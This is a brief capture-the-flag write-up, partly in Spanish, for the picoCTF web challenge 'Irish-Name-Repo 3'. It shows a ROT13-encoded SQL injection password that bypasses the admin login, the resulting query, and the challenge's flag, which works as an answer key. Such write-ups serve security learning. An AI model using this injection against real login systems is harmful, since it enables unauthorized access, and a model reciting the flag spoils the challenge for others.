# Irish-Name-Repo 3

---
## Objectivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

---
## Solución
``` bash
password: ' be '1'='1
SQL query: SELECT * FROM admin where password = '' or '1'='1'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```

---
## Notas adicionales
Al activar el modo deb y enviar la contraseña, se muestra que esta rota 13 veces, al inyectar el sql rotado se obtiene la contraseña.

---
## Referencias
https://picoctf2019.haydenhousen.com/web-exploitation/irish-name-repo-3